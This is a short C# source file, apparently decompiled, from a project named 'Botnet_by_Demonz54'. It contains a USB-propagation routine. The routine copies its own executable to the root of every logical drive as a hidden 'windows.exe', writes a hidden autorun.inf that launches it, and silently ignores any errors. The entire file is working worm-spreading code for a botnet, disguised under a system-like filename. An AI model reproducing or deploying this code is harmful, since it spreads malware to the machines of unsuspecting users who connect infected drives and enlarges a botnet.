using System;
using System.IO;
using System.Reflection;
using Botnet_by_Demonz54.My;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Botnet_by_Demonz54;

[StandardModule]
internal sealed class usb
{
	public static void USB()
	{
		try
		{
			string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			for (int i = 0; i < array.Length; i = checked(i + 1))
			{
				programFiles = array[i];
				if (!File.Exists(programFiles + "windows.exe"))
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, programFiles + "windows.exe");
				}
				StreamWriter streamWriter = new StreamWriter(programFiles + "autorun.inf");
				streamWriter.WriteLine("[autorun]");
				streamWriter.WriteLine("open = windows.exe");
				streamWriter.WriteLine("shellexecute=windows.exe");
				streamWriter.Close();
				File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
				File.SetAttributes(programFiles + "windows.exe", FileAttributes.Hidden);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
